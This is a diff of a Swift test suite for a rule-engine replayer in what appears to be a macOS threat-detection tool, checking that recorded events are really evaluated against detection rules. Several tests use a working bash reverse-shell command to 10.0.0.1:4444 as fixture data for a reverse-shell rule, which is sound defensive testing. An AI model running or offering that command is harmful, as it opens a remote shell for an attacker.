@@ -16,7 +16,7 @@ import Foundation
 @Suite("TraceBundle: RuleEngineReplayer (real evaluation, not echo)")
 struct RuleEngineReplayerTests {
 
-    static let compiledRules = URL(fileURLWithPath: "/tmp/maccrab_v3")
+    static let compiledRules = compiledRulesDirectory
     static let reverseShellRuleId = "d1a2b3c4-0042-4000-a000-000000000042"
 
     /// Mirrors OfflineReplayLane.processCreationEvent: `commandLine` is the
@@ -62,7 +62,7 @@ struct RuleEngineReplayerTests {
 
     @Test("Evaluates the events — a fabricated recorded match is NOT echoed back")
     func evaluatesRatherThanEchoes() async throws {
-        ensureRulesCompiled()
+        try ensureRulesCompiled()
         let replayer = try RuleEngineReplayer(rulesDirectory: Self.compiledRules)
 
         let line = try Self.eventLine(
@@ -79,7 +79,7 @@ struct RuleEngineReplayerTests {
 
     @Test("A benign event yields nothing, even when the recording claims a match")
     func benignEventDoesNotInheritRecordedMatches() async throws {
-        ensureRulesCompiled()
+        try ensureRulesCompiled()
         let replayer = try RuleEngineReplayer(rulesDirectory: Self.compiledRules)
 
         let line = try Self.eventLine(
@@ -94,7 +94,7 @@ struct RuleEngineReplayerTests {
 
     @Test("Result carries the ruleset that ran, not the version in the recording")
     func versionReflectsTheRulesetThatRan() async throws {
-        ensureRulesCompiled()
+        try ensureRulesCompiled()
         let replayer = try RuleEngineReplayer(rulesDirectory: Self.compiledRules)
         let line = try Self.eventLine(
             argv: ["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"],
@@ -110,7 +110,7 @@ struct RuleEngineReplayerTests {
 
     @Test("One entry per rule, even when several events fire the same rule")
     func dedupesByRule() async throws {
-        ensureRulesCompiled()
+        try ensureRulesCompiled()
         let replayer = try RuleEngineReplayer(rulesDirectory: Self.compiledRules)
         let a = try Self.eventLine(argv: ["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"],
                                    id: "00000000-0000-0000-0000-000000000004")
@@ -124,7 +124,7 @@ struct RuleEngineReplayerTests {
 
     @Test("Ruleset digest is content-addressed and folds in the status gate")
     func rulesetDigestIsHonest() async throws {
-        ensureRulesCompiled()
+        try ensureRulesCompiled()
         let all = try RuleEngineReplayer(rulesDirectory: Self.compiledRules)
         let same = try RuleEngineReplayer(rulesDirectory: Self.compiledRules)
         #expect(all.rulesetSha256 == same.rulesetSha256)
@@ -148,7 +148,7 @@ struct RuleEngineReplayerTests {
 
     @Test("An undecodable event line throws instead of silently shrinking the corpus")
     func undecodableLineThrows() async throws {
-        ensureRulesCompiled()
+        try ensureRulesCompiled()
         let replayer = try RuleEngineReplayer(rulesDirectory: Self.compiledRules)
         // Skipping a bad line would quietly reduce the corpus, and a smaller
         // corpus makes recall look better than it is.
@@ -172,7 +172,7 @@ struct RuleEngineReplayerTests {
 
     @Test("Deterministic — identical input yields an identical result")
     func deterministic() async throws {
-        ensureRulesCompiled()
+        try ensureRulesCompiled()
         let replayer = try RuleEngineReplayer(rulesDirectory: Self.compiledRules)
         let lines = [
             try Self.eventLine(argv: ["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"],
